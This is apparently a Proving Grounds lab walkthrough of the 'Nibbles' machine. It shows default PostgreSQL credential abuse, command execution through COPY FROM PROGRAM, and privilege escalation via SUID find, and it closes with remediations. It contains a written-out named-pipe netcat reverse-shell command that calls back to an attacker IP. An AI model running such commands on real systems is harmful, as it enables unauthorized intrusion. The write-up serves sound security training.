Proving Grounds Walkthrough

Nibbles

July 23, 2026 • Medium • Target IP: 192.168.x.47

Summary: Machine starts with an open posgresql port, which has default postgres:postgres login enabled, while retaining the Superuser functionality. This is exploited to trigger a reverse shell. A binary with SUID is then exploited to gain root access to the system.

Attack Chain

  • Foothold: Port 5437 Postgresql -> OS command execution -> Low-Privilege Shell
  • PrivEsc (Root): SUID Exploitation (/usr/bin/find) -> Namespace Escape

We authenticate as user postgres and password postgres to port 5437. Once the authentication is successful, we can list all users and the associated roles they have with \du. This helps us establish that the compromised postgres has Superuser attributes.

Hackviser has a detailed article on Pentesting Postgresql, where they show how COPY FROM functionality can be exploited for File operations and Code execution.

Essentially, we need to create a table for the command output, and use the COPY FROM functionality to execute code, which copies the output of the code into the table, which we can subsequently read by a simple SELECT database command

But first, we need to find a database and connect to it. We can list the databases using the \list, and then use the \connect db_name to connect to it. In this instance, we connect to the default database, postgres

Now, we just need to create a table of text datatype to store the command outputs, using the create table cmd_results (DATA text); command. At this stage, we can test command execution.

For linux-based operating systems, ideally we start with the identity of the user, then check other users in /etc/passwd, and think of trying to get their id_rsa, or writing a reverse shell into the victim and triggering it. And for Windows-based systems, we start with identity, C:\Windows\win.ini and write a netcat executable, and trigger a reverse shell.

So the next logical step is to write a reverse shell into the victim, and trigger it. I like to use a named pipe reverse shell, over the netcat binary, since you arent always gaurenteed the netcat version supports the -e option. Start the netcat listener, write the reverse shell file, and trigger it!

postgres=# COPY cmd_results FROM PROGRAM 'echo "mkfifo /tmp/f; nc 192.168.45.236 22 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f" > /dev/shm/rev_shell.sh';
COPY 0
postgres=# COPY cmd_results FROM PROGRAM 'chmod +x /dev/shm/rev_shell.sh; bash /dev/shm/rev_shell.sh';

Privilege Escalation

Now that we have the local user flag, we can proceed with regular privesc mannual checks, like sudo -l, checking any strange files with SUID bits set, crontabs, exports, capabilities, internal ports, groups, writable directories in $PATH, any unusual file is /opt, running processes, groups, etc. Then we can proceed to more advanced ones. Always a good idea to cover the basics mannually, with a checklist, because it is easy to forget or miss simple things.

Upon checking for binaries with SUID bits set, we find an unusual one, find. It is a logical next step to then check GTFObins for a privesc breakout.

The section on gtfobins find shows how the inbuild exec option of the find command can be used to invoke a shell, and because of the SUID, the context of the shell invoke is by root, hence escalation of privilege.

Remidiations

  • Restrict the access of Postgresql to Localhost, unless explicitly required to be accessible from external networks.
  • Revoke the Superuser permissions for the default SuperUser postgres, unless explicitly required
  • The password for db user postgres should be a randomly generated long string. Do not use weak passwords that are consistent with weak password policies.
  • The find command should not have SUID set for all users.
